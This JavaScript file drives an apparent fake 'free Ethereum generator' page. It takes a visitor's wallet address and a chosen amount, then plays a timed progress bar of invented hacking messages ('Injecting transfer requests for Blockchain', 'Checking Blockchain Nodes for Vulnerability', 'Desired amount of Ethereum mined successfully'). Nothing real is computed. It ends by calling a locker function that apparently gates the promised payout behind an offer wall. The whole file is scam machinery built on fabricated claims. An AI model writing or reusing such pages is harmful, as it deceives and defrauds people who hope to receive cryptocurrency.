$(function () {
  /*
	=========================================
	UI
	=========================================
	*/

  /*
	Configure the generator messages
	*/
  var generator_timeout = null;
  var generator_step = 0;
  var generator_speed = 1000; /* Change this value to the miliseconds you want 1s = 1000
	
	/*
	Add / remove as many messages as you want
	The percentage is the progress-bar percentage and the message is the text you want to be shown
	*/
  var generator_messages = [
    { percentage: 1, message: "Connecting to server." },
    { percentage: 1, message: "Connecting to server.." },
    { percentage: 1, message: "Connecting to server..." },
    { percentage: 3, message: "Connecting to server." },
    { percentage: 3, message: "Connecting to server.." },
    { percentage: 3, message: "Connecting to server..." },
    { percentage: 5, message: "Connecting to server." },
    { percentage: 5, message: "Connecting to server.." },
    { percentage: 5, message: "Connecting to server..." },
    { percentage: 5, message: "Connecting to server." },
    { percentage: 5, message: "Connecting to server.." },
    { percentage: 8, message: "Wallet address verified." },
    { percentage: 8, message: "Wallet address verified.." },
    { percentage: 8, message: "Wallet address verified..." },
    { percentage: 12, message: "Injecting transfer requests for Blockchain." },
    { percentage: 12, message: "Injecting transfer requests for Blockchain.." },
    {
      percentage: 15,
      message: "Injecting transfer requests for Blockchain...",
    },
    {
      percentage: 20,
      message:
        "Blockchain connection approved through port: a2ce:8542:29af:lc9a:rr34",
    },
    {
      percentage: 23,
      message:
        "Blockchain connection approved through port: a2ce:8542:29af:lc9a:rr34",
    },
    { percentage: 25, message: "Connection Established!" },
    { percentage: 27, message: "Checking Blockchain Nodes for Vulnerability." },
    {
      percentage: 27,
      message: "Checking Blockchain Nodes for Vulnerability..",
    },
    {
      percentage: 27,
      message: "Checking Blockchain Nodes for Vulnerability...",
    },
    { percentage: 29, message: "Checking Blockchain Nodes for Vulnerability." },
    {
      percentage: 31,
      message: "Checking Blockchain Nodes for Vulnerability..",
    },
    {
      percentage: 32,
      message: "Checking Blockchain Nodes for Vulnerability...",
    },
    {
      percentage: 37,
      message: "Checking Blockchain Nodes for Vulnerability (OK)",
    },
    { percentage: 40, message: "New Ethereum block generated!" },
    { percentage: 40, message: "New Ethereum block generated!" },
    { percentage: 40, message: "New Ethereum block generated!" },
    { percentage: 40, message: "New Ethereum block generated!" },
    { percentage: 43, message: "New Ethereum block generated!" },
    { percentage: 43, message: "New Ethereum block generated!" },
    { percentage: 43, message: "New Ethereum block generated!" },
    { percentage: 43, message: "New Ethereum block generated!" },
    { percentage: 45, message: "New Ethereum block generated!" },
    { percentage: 45, message: "New Ethereum block generated!" },
    { percentage: 48, message: "Reading Blockchain Head." },
    { percentage: 50, message: "Reading Blockchain Head.." },
    { percentage: 50, message: "Reading Blockchain Head..." },
    {
      percentage: 55,
      message:
        "Message received: 0x56a56gbf856c2vk734gfgjnh432sasdd335dsg62 0x85e6cdE845de593d4b8D53aE9fcf1897795ed0A7",
    },
    { percentage: 60, message: "Decoding message." },
    { percentage: 60, message: "Decoding message.." },
    { percentage: 60, message: "Decoding message..." },
    { percentage: 60, message: "Decoding message." },
    { percentage: 60, message: "Decoding message.." },
    { percentage: 60, message: "Decoding message.." },
    { percentage: 67, message: "Message decoded!" },
    { percentage: 70, message: "Ethereum block sucesfully generated..." },
    { percentage: 74, message: "Writing Blockchain Head." },
    { percentage: 74, message: "Writing Blockchain Head.." },
    { percentage: 74, message: "Writing Blockchain Head..." },
    { percentage: 74, message: "Writing Blockchain Head." },
    {
      percentage: 80,
      message: "Desired amount of Ethereum mined successfully",
    },
    { percentage: 85, message: "Parsing data." },
    { percentage: 88, message: "Parsing data.." },
    { percentage: 92, message: "Parsing data..." },
    { percentage: 93, message: "Parsing data." },
    { percentage: 93, message: "Parsing data.." },
    { percentage: 95, message: "Parsing data..." },
    { percentage: 96, message: "Waiting for miner fee verification..." },
    { percentage: 96, message: "Waiting for miner fee verification..." },
    { percentage: 98, message: "Waiting for miner fee verification..." },
    { percentage: 98, message: "Waiting for miner fee verification..." },
    { percentage: 100, message: "Waiting for miner fee verification..." },
  ];

  function show_message() {
    /* If there are more messages to show */
    if (generator_step < generator_messages.length) {
      var message = generator_messages[generator_step].message;
      var percent = generator_messages[generator_step].percentage;
      $("#progressbar-message").html(message);
      $("#progressbar")
        .attr("aria-valuenow", percent)
        .attr("style", "width:" + percent + "%");
      generator_step++;
      generator_timeout = setTimeout(function () {
        show_message();
      }, generator_speed);
    } else {
    /* If all messages are shown */
      $("#step2").hide();
      $("#step3").show();
    }
  }

  /*
	The user clicks the Step 1 generate button
	*/
  $("#step1-submit").click(function (e) {
    e.preventDefault();
    var wallet = $("#wallet").val();
    if (wallet.length <= "34" || wallet.length >= "45") {
      alert("Please enter your correct Ethereum wallet address!");
      return;
    }
    /* If the user has entered a wallet */
    var valueEthereum = document.getElementById("myRange");
    document.getElementById("addedValue").innerHTML = valueEthereum.value;
    $("#step1").hide();
    $("#about").hide();
    $("#step2").show();
    show_message();
  });

  /* 
	The user clicks the Step 3 download button
	*/
  $("#step3-submit").click(function (e) {
    e.preventDefault();
    $("#step3").hide();
    my_locker_init();
  });
});

$(document).ready(function () {
  var slider = document.getElementById("myRange");
  var output = document.getElementById("sliderValue");
  output.innerHTML = slider.value;

  slider.oninput = function () {
    output.innerHTML = this.value;
  };
});
